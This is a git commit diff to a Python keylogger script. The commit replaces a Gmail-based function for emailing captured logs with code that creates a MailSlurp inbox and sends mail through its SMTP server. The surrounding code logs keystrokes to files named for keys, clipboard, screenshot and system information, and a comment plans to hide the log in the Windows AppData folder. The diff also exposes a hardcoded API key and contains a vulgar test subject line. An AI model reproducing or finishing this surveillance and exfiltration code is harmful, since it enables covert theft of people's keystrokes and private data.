b08eabc89645269f55790eade0cab0e906aa8883
G33k8 <atharva08106@gmail.com>
2024-10-26 13:26:25 +0530

    added encrypted emailing :)

--- keylogger.py
+++ keylogger.py
@@ -4,6 +4,11 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
+from os import access
+import mailslurp_client
+from requests import options
+from smtplib import SMTP
+
 import socket
 import platform
 
@@ -29,7 +34,7 @@ keys_information = "key_log.txt"
 system_information = "syseminfo.txt"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
-
+#file_path to be changed to C:\Users\Geek\AppData\Roaming
 file_path = os.getcwd()
 extend="\\"
 
@@ -49,6 +54,7 @@ def on_press(key):
 
 def write_file(keys):
     with open(file_path+extend+keys_information,"a") as f:
+        print("file opened in roaming succesffully")
         for key in keys:
             k=str(key).replace("'","")
             if k.find("space")>0:
@@ -65,25 +71,28 @@ def on_release(key):
 with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
-def send_email(filename, attachment, toaddr):
 
-    fromaddr = email_address
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "Log file"
-    body = "Body_of_the_mail"
-    msg.attach(MIMEText(body, 'plain'))
-    filename = filename
-    attachment = open(attachment, 'rb')
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload(attachment.read())
-    encoders.encode_base64(p)
-    p.add_header('Content-Deposition', "attachment; filename= %s" %filename)
-    msg.attach(p)
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(fromaddr,password)
-    text = msg.as_string()
-    s.sendmail(fromaddr, toaddr, text)
-    s.quit()
+# create a mailslurp configuration
+configuration = mailslurp_client.Configuration()
+configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
+with mailslurp_client.ApiClient(configuration) as api_client:
+    # create an inbox
+    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
+    options = mailslurp_client.CreateInboxDto()
+    options.name = "data"
+    options.inbox_type="SMTP_INBOX"
+    inbox = inbox_controller.create_inbox_with_options(options)
+    print("email address is " + inbox.email_address)
+    
+access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
+print(access_details)
+print("sending")
+with SMTP(
+    host=access_details.smtp_server_host,
+    port= access_details.smtp_server_port,
+) as smtp:
+    msg="Subject: I LOVE COCK AND BALLS\r\n\r\nThis is my body" #have to add attachments 
+    smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
+    smtp.sendmail(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
+    smtp.quit()
+print("check your mail :)")
